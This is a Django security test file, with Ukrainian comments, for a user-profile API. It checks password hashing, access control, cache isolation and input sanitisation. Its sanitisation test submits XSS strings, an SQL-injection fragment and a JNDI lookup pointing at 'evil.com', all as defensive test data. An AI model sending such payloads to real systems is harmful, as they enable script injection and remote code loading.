import json
from django.test import TestCase, Client
from django.contrib.auth import get_user_model

User = get_user_model()


class DataSecurityTest(TestCase):
    """Тести безпеки даних"""

    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            email='data_sec@example.com',
            password='DataSec123!',
            is_verified_email=True
        )

    def test_sensitive_data_exposure(self):
        """Тест витоку чутливих даних"""
        self.client.force_login(self.user)

        response = self.client.get('/api/user/profile/')
        data = response.json()

        # Чутливі дані не повинні повертатись
        sensitive_fields = ['password', 'password_hash', 'session_key']

        for field in sensitive_fields:
            self.assertNotIn(field, str(data).lower())

        # Перевірка що email masked або не повністю розкритий
        email = data.get('user', {}).get('email', '')
        self.assertIsNotNone(email)

    def test_data_encryption_at_rest(self):
        """Тест шифрування даних в БД"""
        # Створення користувача з чутливими даними
        sensitive_user = User.objects.create_user(
            email='sensitive@example.com',
            password='SensitivePass123!',
            is_verified_email=True
        )

        # Перевірка що пароль захешований
        from django.db import connection
        with connection.cursor() as cursor:
            cursor.execute(
                "SELECT password FROM users_user WHERE email = %s",
                ['sensitive@example.com']
            )
            result = cursor.fetchone()

            if result:
                stored_password = result[0]
                # Пароль повинен бути захешований, не в plain text
                self.assertNotEqual(stored_password, 'SensitivePass123!')
                self.assertTrue(stored_password.startswith(('pbkdf2_', 'bcrypt', 'argon2')))

    def test_personal_data_access_control(self):
        """Тест контролю доступу до персональних даних"""
        # Створення двох користувачів
        user1 = User.objects.create_user(
            email='user1@example.com',
            password='User1Pass123!',
            is_verified_email=True
        )

        user2 = User.objects.create_user(
            email='user2@example.com',
            password='User2Pass123!',
            is_verified_email=True
        )

        # User1 спробує отримати дані User2
        self.client.force_login(user1)

        # Спроба доступу до профілю іншого користувача
        response = self.client.get(f'/api/user/{user2.id}/profile/')

        # Доступ повинен бути заборонений
        self.assertIn(response.status_code, [403, 404])

    def test_data_sanitization(self):
        """Тест санітизації даних"""
        self.client.force_login(self.user)

        # Дані з потенційно небезпечним контентом
        dirty_data = {
            'user': {
                'name': '<script>alert("xss")</script>John',
                'surname': 'DROP TABLE users; -- Smith'
            },
            'profile': {
                'bio': '${jndi:ldap://evil.com/attack}',
                'location': '<img src=x onerror=alert(1)>New York'
            }
        }

        response = self.client.patch(
            '/api/user/profile/',
            data=json.dumps(dirty_data),
            content_type='application/json'
        )

        self.assertEqual(response.status_code, 200)

        # Перевірка санітизації
        response = self.client.get('/api/user/profile/')
        clean_data = response.json()

        # Небезпечний контент повинен бути видалений/заекранований
        user_data = clean_data.get('user', {})
        profile_data = clean_data.get('profile', {})

        self.assertNotIn('<script>', user_data.get('name', ''))
        self.assertNotIn('DROP TABLE', user_data.get('surname', ''))
        self.assertNotIn('${jndi:', profile_data.get('bio', ''))
        self.assertNotIn('onerror', profile_data.get('location', ''))

    def test_cache_security(self):
        """Тест безпеки кешу"""
        self.client.force_login(self.user)

        # Запит що потрапляє в кеш
        response = self.client.get('/api/user/profile/')
        self.assertEqual(response.status_code, 200)

        # Спроба отримати дані з кешу з іншого акаунту
        other_user = User.objects.create_user(
            email='cache_attack@example.com',
            password='CacheAttack123!',
            is_verified_email=True
        )

        self.client.force_login(other_user)

        # Спроба отримати кешовані дані іншого користувача
        response = self.client.get('/api/user/profile/')
        data = response.json()

        # Повинні повертатись дані поточного користувача, не з кешу
        self.assertEqual(data['user']['email'], 'cache_attack@example.com')
        self.assertNotEqual(data['user']['email'], 'data_sec@example.com')

    def test_log_security(self):
        """Тест безпеки логування"""
        # Логін з невалідними даними
        response = self.client.post('/api/auth/login/', {
            'email': 'log_test@example.com',
            'password': 'WrongPassword123!'
        })

        # Паролі не повинні логуватись в plain text
        # (Цей тест перевіряє налаштування логування)
        self.assertEqual(response.status_code, 400)

        # Можна додати перевірку log файлів якщо доступні
        # або mock logging для перевірки